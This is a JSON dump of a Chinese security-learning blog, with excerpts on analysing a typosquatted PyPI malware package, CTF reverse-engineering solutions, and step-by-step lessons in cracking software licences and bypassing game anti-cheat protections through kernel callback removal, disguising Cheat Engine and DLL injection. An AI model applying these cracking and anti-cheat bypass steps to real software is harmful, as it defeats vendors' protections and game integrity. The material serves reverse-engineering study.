[{"title":"hw-360天擎钓鱼项目找到服务器","date":"2022-09-04T11:40:49.000Z","url":"/2022/09/04/hw-360%E5%A4%A9%E6%93%8E%E9%92%93%E9%B1%BC%E9%A1%B9%E7%9B%AE%E6%89%BE%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/","categories":[["undefined",""]],"content":"当安装时，就会出现无fake_useragant的信息，这个时候可能就会pip install useragant。但问题就在这里，这里的库被改了名字，正常的ua库应该是fake_useragent。把e改成了a 偷张图 去pypi上找，目前阿里云源上的fake_useragent已经被删除。在豆瓣源上还有 在看到github上源文件的34行调用了一个exit函数 在fake.py文件中找到调用的exit函数。Exit函数中有调用了系统函数taskkill强制终止进程(这里可能是结束当前的进程，执行后面的函数) 这边的urllib2也是自己重写了 这里把pickle 重命名了为json。 然后解密，发现了一个地址。下载之后 是一个伪造的图片(加了一个gif89a的头) base64.decodebytes解密即可。再次解密 最后去掉下面的注释 找到本机和120.79.87.123进行了ping通信。后续可能是服务器断了。没有进一步操作。弹回去的操作或者什么的？ 最后加载shellcode的方式参见 参考文章："},{"title":"2022-强网杯部分题解","date":"2022-08-05T14:49:00.000Z","url":"/2022/08/05/2022-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/","tags":[["2020强网杯","/tags/2020%E5%BC%BA%E7%BD%91%E6%9D%AF/"]],"categories":[["undefined",""]],"content":" re gamemaster crypto gamemasterc#写的程序，用dnspy打开，最上面打开了一个文件（gamemessage），把他存给memory 再在goldfunc里找到^34的操作 再往下有对goldfunc，aes的操作 扔cyberchef里，找到MZ文件头(exe的文件头) 根据这里的代码，写z3代码爆破，xyz三个值。因为tmp的值是由xyz计算得来。所以需要tmp的每位都和first相等，每一条都作为约束添加进去。所以写个z3爆破。 在根据parsekey求出array4 整合用parsekey和异或求flag异或的话，可以直接用range(len(flag))的方式。还可以直接用enumerate函数求(挺方便的，同时遍历列表中的元素和当前的i) "},{"title":"NTUSTISC - Pwn Basic 2 [2019.03.19]学习记录","date":"2022-02-07T05:18:00.000Z","url":"/2022/02/07/NTUSTISC-Pwn-Basic-2-2019-03-19-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":[["NTUSTISC","/tags/NTUSTISC/"]],"categories":[["undefined",""]]},{"title":"DIY易语言程序","date":"2022-02-06T08:57:00.000Z","url":"/2022/02/06/DIY%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"信息框改窗口右键二进制复制这一串窗体代码 再去根据特征码找按钮事件 框起来的是子程序必须有的两段语句 直接二进制粘贴代码 在把后面的三行代码放后面实现替换（信息框改成了窗口）call后面的地址可能会改变，要自己改回来 信息框弹出+窗体（来回jmp）下易语言的按钮断点事件 把上面的一块复制下来 复制下来要改call的地址 右键数据窗口中跟随立即数 然后保存即可修改弹出内容 因为只有4行的空间给我们添加窗体，所以这里通过jmp去别的地址 jmp到别的地址 一定要记得jmp回去call的地址要改一下残留的代码就nop掉（不然影响程序流程） 不认爹的窗体修改完父窗体还是可以加载窗体的"},{"title":"花指令与CM","date":"2022-02-06T04:47:00.000Z","url":"/2022/02/06/%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8ECM/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"一进来就是这种看啊看不懂的指令一般都是加花了 一般的话可以用peid脱壳器来找 这里用通用OEP查找工具来找 去到OEP的地址，右键下一个硬件执行 然后就脱壳就可以了 找按钮事件，全下上断点 断在这之后，F7跟进去 F8两次之后还有花 插件 E junk code maindlg去花 一直F8往下找，走到这的时候卡主，下断。 再次运行到断的这里，F7进call，往下走。找大跳转 把这个跳转给nop掉，然后F9运行看看是否成功 下面还有个跳转，跳过了一些敏感的东西。也把他nop掉 成功了 "},{"title":"NTUSTISC - Pwn Basic 1 [2019.03.12]学习记录","date":"2022-02-06T04:14:00.000Z","url":"/2022/02/06/NTUSTISC-Pwn-Basic-1-2019-03-12-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":[["NTUSTISC","/tags/NTUSTISC/"]],"categories":[["undefined",""]],"content":"pwntools的一些函数 objdump readelf binary format x64 calling convention(64位下调用规则) lab0 过一次验证，然后回答1000个问题就可以了 lab1源码处buf只有16的大小。但是read读了0x30个大小。可造成栈溢出 找到shell函数的地址 buf是16，下面有个rbp（栈底）是8位。16+8=0x18 脚本就写出来了 at调式之法 ret出call 来到了函数地方 参数都传给寄存器了，就开始调用了"},{"title":"易语言特征","date":"2022-02-05T06:18:00.000Z","url":"/2022/02/05/%E6%98%93%E8%AF%AD%E8%A8%80%E7%89%B9%E5%BE%81/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"时钟点击去到易语言体 ctrl+g跳转到SetTimer 一共就4行的时钟事件 改成他的retn 10（段尾），直接就跳出了 窗体窗体创建的子程序520开头的是窗体id（可用于替换窗体） 主窗体 弹窗弹窗的汇编代码后面的立即数存放的是要弹出的数据 退出从易语言体往下找，找到4个jmp。一个一个跟进去看（一般都是最下面的jmp） 找到了一个Exitprocess 直接修改段首为retn（就实现不退出了） 遇到退不出的情况下，可以跟过去查看是如何调用的(判断什么的)"},{"title":"修改软件资源&打造个人od","date":"2022-02-05T04:16:00.000Z","url":"/2022/02/05/%E4%BF%AE%E6%94%B9%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90-%E6%89%93%E9%80%A0%E4%B8%AA%E4%BA%BAod/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"修改软件资源点资源查看/编辑器 改完后的界面 打造个人od查找到Ollydbg.ollydbg的修改前面的字符串即可成功修改标题 "},{"title":"所有模块间的调用","date":"2022-02-05T02:33:00.000Z","url":"/2022/02/05/%E6%89%80%E6%9C%89%E6%A8%A1%E5%9D%97%E9%97%B4%E7%9A%84%E8%B0%83%E7%94%A8/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"退出程序的话，如果是易语言 vc++ delphi可以直接下exitprocess的api断点vb的话要去所有模块间的调用找vbaend 在每个vba上设置断点 把每个call的断点在取消掉，在上面的跳转下断。在慢慢断f9运行，改z标志位 软件成功打开，但弹出了个5分钟后的关机提醒。然后把每个跳转改成jmp保存 找字符串找到写入文件的文件名 跳到段首，下断点。运行看看 改写文件内容实现不关机在右边找到然后右键数据窗口中跟随。数据窗口中选中然后空格修改成0。这样写入的文件就全是0 不写文件实现不关机还是段首，f9跑起来 F8一直单步下去，直到弹出关机窗口 往下运行，走出这个call。看出跳转，直接改写 保存"},{"title":"按钮事件总结","date":"2022-02-04T03:35:00.000Z","url":"/2022/02/04/%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BB%93/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"识别语言 按钮事件-1 Delphi&amp;BC++ 给每一个符合特征的地方都下断，然后在运行起来。F7进call太多特征码的话可能需要用到脚本 delphi和BC++都可以用darkde4 按钮事件-2 VBVB按钮特征码816C24 直接给每个符合条件的地方下断就可 按钮事件-3 MFC只要是mfc的程序调用都会有mfc42.dll 双击跟进去ctrl+f查找sub eax,0a 找到下面的je，回车跟到他跳转的地方 给下一行的call下断 按钮事件-4 易语言查找FF25，有的话基本都是易语言的程序。左边框起来的称为易语言体 搜索易语言特征码FF 55 FC 5F 5E 按钮事件-5 e-debuge-debug基本能识别易语言的程序，然后直接start。然后输东西点按钮就可以了。会直接给你找到按钮的地址 按钮事件-6 VC++右键查找所有命令 sub eax,0a 这里跟mfc是一样的，回车跟过去，在给call下断 f7进call在F8两次才来到关键代码处 按钮事件-7 万能断点先运行起来，输入东西，别点按钮 查看模块 ‘user32’ctrl+b搜索万能断点特征码 按按钮，然后断下来之后，alt+f9返回程序领空 f8几次找到真码 "},{"title":"VB的通用技巧","date":"2022-02-02T04:53:00.000Z","url":"/2022/02/02/VB%E7%9A%84%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"发现打不开的话 把文件复制到system32文件夹里在cmd输入命令，即可打开regsvr32 C:\\WINDOWS\\system32\\msstdfmt.dll 用脚本下所有按钮事件的断点 运行起来之后发现断下来了，但是软件没有打开，因为是一个重启验证的软件，然后F8跟过去看看 找FFFF这个特征0xFFFF就是85%VB程序用于判断的数值，直接影响下面的关键跳。调试VB程序时看到有东西和FFFF操作，就要注意 F9运行起来之后，F8单步。然后nop掉代码，解决掉重启验证 删掉除了刚刚下的所有断点 在查找和这条一样的所有命令 直接在每个命令上下断点 进去之后点帮助的关于（是否注册） 一样运行起来，nop掉保存就可以了"},{"title":"网络验证的本地突破","date":"2022-02-01T14:11:00.000Z","url":"/2022/02/01/%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%9A%84%E6%9C%AC%E5%9C%B0%E7%AA%81%E7%A0%B4/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"软件主界面 软件注册的界面 DIE查壳是delphi写的 右键显示附加数据。就找到了主界面的激活软件的按钮 在找到开始激活的按钮 在去复制他的段首地址,od打开，跳到这个位置然后断下来 往下找，找到一个动不了的地方。把他nop掉（猜测可能是网络的验证什么的） 在把跳转的地方改成nop。就可以了"},{"title":"淘小秘push绕登录框+去暗桩","date":"2022-02-01T05:31:00.000Z","url":"/2022/02/01/%E6%B7%98%E5%B0%8F%E7%A7%98push%E7%BB%95%E7%99%BB%E5%BD%95%E6%A1%86-%E5%8E%BB%E6%9A%97%E6%A1%A9/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"软件登录窗口 od载入时，没有弹出提示，表示程序无壳，无壳就可以使用push弹窗法FF 55是易语言按钮事件FF 25是窗体ctrl+b搜一下 在易语言体中搜索push 10001 找到0x52开头的，在去之前的地方替换掉 成功替换掉窗体 找到其中一个，一打开就退出。猜测可能是主窗体（下一个exitprocess的api断点） 返回到程序的名字右键反汇编窗口中跟随 可以看到是程序的名字（不能alt+f9，不然就退出了） 重新运行，发现确实会断在这个call处，直接把上面的跳转改成jmp即可 成功 push窗体法容易出现暗桩，蓝屏，格盘。。。慎用"},{"title":"制作内存补丁","date":"2022-01-31T08:34:00.000Z","url":"/2022/01/31/%E5%88%B6%E4%BD%9C%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"因为窗体上有个未注册 搜注册，找到个已注册 找到了个大跳，跳过了已注册，所以就修改为nop 打补丁的话就是修改当前位置的语句，90就是nop。每2个数字算一个长度。所以12位/2就是6位本来的指令的机器码修改成nop也就是90。位数也要对照起来运行起来的效果就是启动时窗体会有你想要的效果 破解补丁就是先加载这个程序，相应的地址里边的代码给改掉"},{"title":"F12暂停法寻真码","date":"2022-01-31T04:49:00.000Z","url":"/2022/01/31/F12%E6%9A%82%E5%81%9C%E6%B3%95%E5%AF%BB%E7%9C%9F%E7%A0%81/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"f9运行起来，输入假码点确定 f12之后alt+f9。然后再去点确定 然后在回去就找到了messagebox的弹窗 两个jmp都可以跳过这个注册失败的弹窗 但是上面应该又有个跳转跳过了这两个jmp 把Z改成1就可以不跳转，但发现是重启验证 找到上面的call（可能是比较） f7进去，f8慢慢找。找到注册码"},{"title":"单步跟踪达到破解","date":"2022-01-30T07:20:00.000Z","url":"/2022/01/30/%E5%8D%95%E6%AD%A5%E8%B7%9F%E8%B8%AA%E8%BE%BE%E5%88%B0%E7%A0%B4%E8%A7%A3/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"程序一次f8就会弹出窗口，重新跑起来，f7跟进call 遇到这种循环或者向上跳转，就找到出口f4从指定位置开始运行 继续找，继续套 多找几次。断的call还是弹窗，上面的jnz可以跳转 jnz改成jmp。保存，成功"},{"title":"darkde4使用方法","date":"2022-01-30T06:30:00.000Z","url":"/2022/01/30/darkde4%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"要拿脱完壳的程序。peid可以看到是bc++ darkde4找到窗口的关键地址（有三个按钮的窗口） 复制另外两个的地址，od载入，给两个地方都下断 生成机器码，F9过就可以了 输入假的注册码 读了机器码 读了假码 虽然没找到真码，但找到了跳转，直接nop。 ok了"},{"title":"线性代数-矩阵(下)","date":"2022-01-30T03:37:00.000Z","url":"/2022/01/30/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5-%E4%B8%8B/","tags":[["线代","/tags/%E7%BA%BF%E4%BB%A3/"]],"categories":[["undefined",""]],"content":"1/7转置的题目 2/7证明矩阵可逆 3/7 -1次方求逆矩阵 4/7 A×A的-1次方=E 5/7 6/7 求矩阵的秩 7/7 给秩，求未知数"},{"title":"线性代数-矩阵(上)","date":"2022-01-29T12:20:00.000Z","url":"/2022/01/29/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5-%E4%B8%8A/","tags":[["线代","/tags/%E7%BA%BF%E4%BB%A3/"]],"categories":[["undefined",""]],"content":"矩阵的相加减直接相加减即可 矩阵的相乘 矩阵的六个情况 矩阵求行列式矩阵求行列式，遇到||，直接展成行列式计算就可以"},{"title":"搜索俄服cf子弹数量","date":"2022-01-29T02:45:00.000Z","url":"/2022/01/29/%E6%90%9C%E7%B4%A2%E4%BF%84%E6%9C%8Dcf%E5%AD%90%E5%BC%B9%E6%95%B0%E9%87%8F/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"1.打开进程 2.思考要搜什么，你能搜什么，分析所搜到的数据 3.不断的修改测试，进行筛选 4.直到定位到正确的关键数据 特点：动态的 实时的 搜索，修改，观察，游戏（软件）进程的内存数据 内存地址分为动态地址与静态地址绿色为静态地址，本（主）程序相关模块的内存地址以及里面的值，一定不会变动。黑色的为动态地址，必变动 当我们从硬盘里运行了一个程序，实际上是把这个文件放到了RAM中随机存取存储器(英语: Random Access Memory,缩写:RAM),也叫主存,是与CPU直接交换数据的内部存储器。它可以随时读写(刷新时除外),而且速度很快,通常作为操作系统或其他正在运行中的程序的临时数据存储介质。RAM工作时可以随时从任何一个指定的地址写入(存入)或读出(取出)信息。 游戏在内存中分为两部分，一部分给了操作系统，一部分是游戏的。而游戏的又分成了数据和代码（汇编代码）两部分 主程序本身，代码放在内存地址中是不变的。代码会创建数据，就会随机分配 数据存放的形式：1.全局数据，直接放在一个内存地址中，映射出的是静态地址 2.程序中存在一个全局指针，指针指向的是动态随机分配的动态地址（且指向一个结构对象）。 找到地址特殊一点的那个就是了，本来可以调试找到偏移，但每次一调试就退出（不知道什么原因）。不过子弹偏移是基址+（偏移）2C8"},{"title":"BC++假自效验","date":"2022-01-29T02:10:00.000Z","url":"/2022/01/29/BC-%E5%81%87%E8%87%AA%E6%95%88%E9%AA%8C/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"shark恒14课 查壳（aspack的壳，bc++写的） esp定律脱壳f8一次，只有esp红，右键hw f9一下，多次f8，跳出 右键分析-&gt;从模块中删除分析 BC++语言的OEP特征 删除硬件断点 用od脱壳调试进程 LordPE修正镜像大小，完整转存 IAT自动搜索，获取输入表，修正转存这里转存完是打不开的 跟踪过去，找IAT。回车进到下面这个call里面 查找到段首，数据窗口中跟随内存地址。（内存区域不是这种形式的话就右键长型-&gt;地址）56E114-400000(段地址)=16E114 把16E114和14E0复制进来，获取导入表，显示无效的（右键删除指针），修正转储 如果是BC++程序脱壳后需要手动修复IAT"},{"title":"破解qq游戏对对碰助手","date":"2022-01-29T01:30:00.000Z","url":"/2022/01/29/%E7%A0%B4%E8%A7%A3qq%E6%B8%B8%E6%88%8F%E5%AF%B9%E5%AF%B9%E7%A2%B0%E5%8A%A9%E6%89%8B/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"修改文件od查找字符串，看到可疑路径。发现是个数字，尝试后发现是试用次数，改成负数即可实现无限试用 字符串查找真码unicode查找”不正确”字符串 向上找到往下跳的地方，转过去。 下个断点，f9运行起来 直接改成nop（保存也可以）。或者也可以直接看到疑似真码（验证是可以的） rtcmsgbox寻真码下一个vb的msgbox断点，f9运行起来之后。alt+f9跳到用户代码段，向上找到关键跳转，然后就和字符串一样操作了 f12寻真码一样的，运行起来F12，在ALT+F9跳出去"},{"title":"摆脱NAG","date":"2022-01-28T12:26:00.000Z","url":"/2022/01/28/%E6%91%86%E8%84%B1NAG/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"shark恒的12课了 运行之后，点右上角关闭的按钮，弹出窗口 F12一下，F12完之后在去到调用堆栈窗口 找到系统领空的messagebox，右键显示调用 F2断在这个地方 单步之后，弹出框，反正已经断下来了，就随便选就可以了。单步走到ret，跳出去 向上找到段首（上面有个ret，旁边还有个大括号）还是没有跳转的，直接往下走，继续跳出去 找到一个跳转和一个弹出框。把断点下载jnz这。可以考虑把jnz改成je 可以过了，成功跳过"},{"title":"绕过俄服cf驱动保护（查看数据）","date":"2022-01-26T09:36:00.000Z","url":"/2022/01/26/%E7%BB%95%E8%BF%87%E4%BF%84%E6%9C%8Dcf%E9%A9%B1%E5%8A%A8%E4%BF%9D%E6%8A%A4%EF%BC%88%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%EF%BC%89/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"名词驱动保护：属于反作弊R0层面反作弊，R3层面反作弊：游戏内存检测 PChunter中内部驱动基本是灰色的，都是microsoft外部的都是蓝色的，software 钩子：技术反作弊的防护用 当非法摘除了钩子，游戏检测到了，就执行了蓝屏的代码回调函数就相当于一个中断处理函数，由系统在符合你设定的条件时自动调用 WKE删钩子，回调函数。看数据kernel-&gt;callback 直接remove这几个即可My.com是VK的国际子公司。所以可以判断这个是cf有关的系统回调 pchunterpchunter摘除钩子 删除回调（防止蓝屏） CE开内核设置完之后即可直接查看，从R3的权限直接提升到了R0。就可以直接绕过保护查看"},{"title":"一些有关game-hacking的windows原理","date":"2022-01-25T10:00:00.000Z","url":"/2022/01/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E5%85%B3game-hacking%E7%9A%84windows%E5%8E%9F%E7%90%86/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"进程：正在运行的程序的实例 进程去分析应是动态分析 可分析进程相关信息：pchunter，火绒剑 火绒剑可按文件位置进行过滤 虚拟内存 安全机制 线程 IPC：进程间通信的机制 在windows中进程只是一个容器，用于装载系统资源，它并不执行代码，它是系统资源分配的最小单元，而在进程中执行代码的是线程，线程是轻量级的进程，是代码执行的最小单位 程序一般都是从0x400000开始的 每个进程都有他自己独一无二的内存，他们之前互不影响 ntdll.dll是我们在用户模式下可以到达的最低点，负责用户模式和内核模式之间的跳跃 ntoskrnl.exe windows系统上都会显示以下系统进程 空闲进程（每个CPU包含一个线程以占用空闲CPU时间） windows子系统（Csrss.exe） 会话初始化（Wininit.exe） 登录过程（WinLogon.exe） 会话管理器（Smss.exe） 本地会话管理器（Lms.exe） 本地安全身份验证服务器（Lsass.exe） Protection Ring（保护环）1.保护环或分层保护域是保扩数据和功能免受故障和恶意行为侵害的机制,特别是在网络安全领域 2.环按从最高特权（通常编号为0）到最低特权（通常编号为3）的层次结构排列,级别依次改变且不可越级 3.在大多数操作系统上, Ring O是目有最高权限的级别,与CPU和内存等物理硬件的交互最直接。 4.大多数现代操作系统对内核/执行程序使用级别0,对应用程序使用级别3。 5.没有必要使用所有四个权限级别,因为当前的操作系统如（Windows、Linu等）大多使用分页机制，而分页只有一个位来指定权限级别,即Supervisor或User（U/S位）。 Windows NT使用两级系统。8086中的实模式程序在级别0（最高特权级别）上执行,而8086中的虚拟模式在级别3上执行所有程序。 在x86保护模式可用的特权级别 对于函数调用的影响 Process Tree（进程树）进程树是一种进程关系表示方法。由父进程和子进程两部分组成 一些程序进程运行后，会调用其他进程，这样就组成了一个进程树 火绒剑可查看父子进程间的关系"},{"title":"基础数论第二课-辗转相除法","date":"2022-01-24T07:17:00.000Z","url":"/2022/01/24/%E5%9F%BA%E7%A1%80%E6%95%B0%E8%AE%BA%E7%AC%AC%E4%BA%8C%E8%AF%BE-%E8%BE%97%E8%BD%AC%E7%9B%B8%E9%99%A4%E6%B3%95/","tags":[["数论","/tags/%E6%95%B0%E8%AE%BA/"]],"categories":[["undefined",""]],"content":"通过辗转相除法计算两数的最大公约数 辗转相除法的一般表示形式辗转相除法的一般表示形式 辗转相除法求二元一次方程（非唯一解）先用贝祖定理判断是否有解，在用辗转相除法算出一个解 辗转相除法证明贝祖定理一直用上一个数代掉代掉证明参考 没有完全的证明，后面感觉太麻烦了。。。。。。。。 python-辗转相除 z3求二元一次方程"},{"title":"简单绕过原神（查看内存）","date":"2022-01-24T06:10:00.000Z","url":"/2022/01/24/%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E5%8E%9F%E7%A5%9E%EF%BC%88%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98%EF%BC%89/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"简单绕过原神之查看yuanshen.exe内存普通的ce查看原神登录器的内存是可以看到的 原神登录器的内存信息 普通的ce查看YuanShen.exe是查看不了的 复制一下64位的ce改名为csrss.exe伪造成windows子系统 即可成功查看到YuanShen.exe的内存"},{"title":"PE获取pid","date":"2022-01-23T08:56:00.000Z","url":"/2022/01/23/PE%E8%8E%B7%E5%8F%96pid/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"PE结构获取PID号CreateToolhelp32SnapshotProcess32FirstProcess32Next "},{"title":"C-结构体栗子","date":"2022-01-21T04:49:00.000Z","url":"/2022/01/21/C-%E7%BB%93%E6%9E%84%E4%BD%93%E6%A0%97%E5%AD%90/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"结构体概念 打怪的结构体实现的栗子"},{"title":"VBapi-tcMsgBox","date":"2022-01-19T11:46:00.000Z","url":"/2022/01/19/VBapi-tcMsgBox/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"SpeedupSystem：vb开发的程序往上滑可以看到vbvm60的标识还有入口点下一行的call jmp.msvbvm60 一个针对vb的api。类似于messgaebox 运行起来输注册码 就会断到我们的api处 call是弹了个窗下面的ret是退出当前的call 跳出去之后发现经典的套娃。往上翻就找到了关键条件 nop掉就可以了 然后就破解成功"},{"title":"万能断点解决重启验证","date":"2022-01-19T11:16:00.000Z","url":"/2022/01/19/%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9%E8%A7%A3%E5%86%B3%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"第10课了这节课涉及了个万能断点的知识万能断点特征码F3 A5 8B C8 83 E1 03 F3 A4 E8一种直接绕过验证，nop或者改jnz都可以（非本课方法） 查user32 找一下万能断点特征码 找到这个地方 输完注册码在断下来。 alt+f9返回到程序代码段 多次f8，找到真码与输入的假码"},{"title":"线性代数-行列式的性质与计算及应用","date":"2022-01-19T08:40:00.000Z","url":"/2022/01/19/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F%E7%9A%84%E6%80%A7%E8%B4%A8%E4%B8%8E%E8%AE%A1%E7%AE%97%E5%8F%8A%E5%BA%94%E7%94%A8/","tags":[["线代","/tags/%E7%BA%BF%E4%BB%A3/"]],"categories":[["undefined",""]],"content":"行列式的性质 四阶行列式的计算 互换两行(列),行列式变号 xxxx和范德蒙行列式 求余子式、代数余子式 行列式展开 多个A或M相加减 给一方程组，判断其解情况(克莱姆法则) 克莱姆法则例题"},{"title":"API断点之(MessageBoxA和GetPrivateProfileStringA)","date":"2022-01-18T07:40:00.000Z","url":"/2022/01/18/API%E6%96%AD%E7%82%B9%E4%B9%8B-MessageBoxA%E5%92%8CGetPrivateProfileStringA/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"shark恒的第8课到第9课的合集 程序领空与系统领空的问题 jd抢购破解先打开软件注册，发现有个弹窗，就给他下个messagebox的api断点 运行起来就跳到断点的地方 一直f8单步下去 还是一直f8 这次是很长的f8 继续f8 来到了关键地方，看到了注册成功与注册失败 看到了跳过了注册成功，跟到上面的跳转。 然后把系统断点给禁用掉，只留一个我们刚刚断的 f9起来之后，跳转直接给他nop掉就破解成功了 QQ手机短信传情破解重启验证的软件 getprivateprofilestringa针对ini重启验证的断点。对ini文件进行读取的拦截 当前在系统领空，alt+f9（到程序领空） f8两次看到读了机器码。并且下面有个ret可以退出 继续f8之后又来到系统领空。继续alt+f9跳出去 继续f8之后可以发现有两个疑似的真码。其中一个可用 注册成功"},{"title":"vmp壳内爆破与寻注册码","date":"2022-01-17T03:19:00.000Z","url":"/2022/01/17/vmp%E5%A3%B3%E5%86%85%E7%88%86%E7%A0%B4%E4%B8%8E%E5%AF%BB%E6%B3%A8%E5%86%8C%E7%A0%81/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"第六课和第七课的学习合集了属于是=。= 文件巴士vmp的壳 od运行起来，跳到401000之后，找字符串。 找到字符串之后找到他的相关跳转。 断到关键跳的地方 nop掉 一路运行下去。就成功破解了 星空网游LEG阿里云破解补丁先注册一遍，他会把信息写到ini里 下一个readfile的api。跳到401000 找到关键信息，跟过去 断到关键跳 取消其他的断点，就保留我们刚断的断点。F9运行看到真码"},{"title":"基础数论第一课-裴蜀引理","date":"2022-01-15T14:02:00.000Z","url":"/2022/01/15/%E5%9F%BA%E7%A1%80%E6%95%B0%E8%AE%BA%E7%AC%AC%E4%B8%80%E8%AF%BE-%E8%A3%B4%E8%9C%80%E5%BC%95%E7%90%86/","tags":[["数论","/tags/%E6%95%B0%E8%AE%BA/"]],"categories":[["undefined",""]],"content":"舀水问题。手舀，非证明。用8L和13L的两个被子舀一次2L和3L和4L都是可以舀的。也可以用算式表达出来 四个预备知识： 约数和倍速：如果一个整数a能被正整数b整除，也就是说存在另一个整数p使得a=bp或者a/b=p，那么我们就称b是数a的约数或因数，a是数b的倍数 正整数a的两个倍数的和或差还是a的倍数 公约数和最大公约数，如果正整数p同时是两个整数a，b的约数，我们就称p为a和b的公约数。a和b的所有公约数中最大的那个数称为a和b的最大公约数 带余除法：给定一个整数a和一个正整数p，总能找到一个整数b使得a=bq+r，其中0&lt;=r&lt;q。我们称r为a被q除的余数 斐蜀引理证明： 斐蜀引理引用到舀水问题8x+13y时候。gcd(8,13)=1，所有求的数都是1的倍数。所以可以舀出来，也就是可成立8x+13y=2,=3,=4都可以舀出来 斐蜀引理推论一个大于1的正整数，如果只有1和它本身两个约数，就称它为素数。两个整数的最大公约数如果为1，就称这两个数互素 推论一：两个整数a和b互素当且仅当下面(x,y)方程有整数解ax+by=1 推论二：如果素数p整除两个整数a和b的乘积ab，则p必然会整除a或b"},{"title":"关键call和关键跳（eax决定）","date":"2022-01-14T12:18:00.000Z","url":"/2022/01/14/%E5%85%B3%E9%94%AEcall%E5%92%8C%E5%85%B3%E9%94%AE%E8%B7%B3%EF%BC%88eax%E5%86%B3%E5%AE%9A%EF%BC%89/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"无壳，进去直接搜“注册”两字。 跟过去，找到上面的je跳转。je的跳转基于ZF的数，如果zf=1即跳转。那上面肯定就会处理zf的值。找到上面的call（断点） 运行起来之后随便输 断在这里之后，f7进入call的跳转 修改mov eax,1(把1赋值给eax，al就=1)。ret在跳出去 保存且成功之后。注册的按钮就会变灰了"},{"title":"dll注入pvc修改阳光数","date":"2022-01-14T09:11:00.000Z","url":"/2022/01/14/dll%E6%B3%A8%E5%85%A5pvc%E4%BF%AE%E6%94%B9%E9%98%B3%E5%85%89%E6%95%B0/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"指针小应用 dll注入pvc修改阳光数量dllmain入口点相关知识 基址为0x7578F8 生成之前一定一定要修改 CE-&gt;查看内存-&gt;ctrl+i注入dll"},{"title":"C遍历cs1.6房间人物","date":"2022-01-14T07:52:00.000Z","url":"/2022/01/14/C%E9%81%8D%E5%8E%86cs1-6%E6%88%BF%E9%97%B4%E4%BA%BA%E7%89%A9/","categories":[["undefined",""]],"content":"找到四重指针和最后的基址（子弹）去不断遍历数据，去筛选符号条件的数据（血量==100.0 并且 z坐标&lt;0） 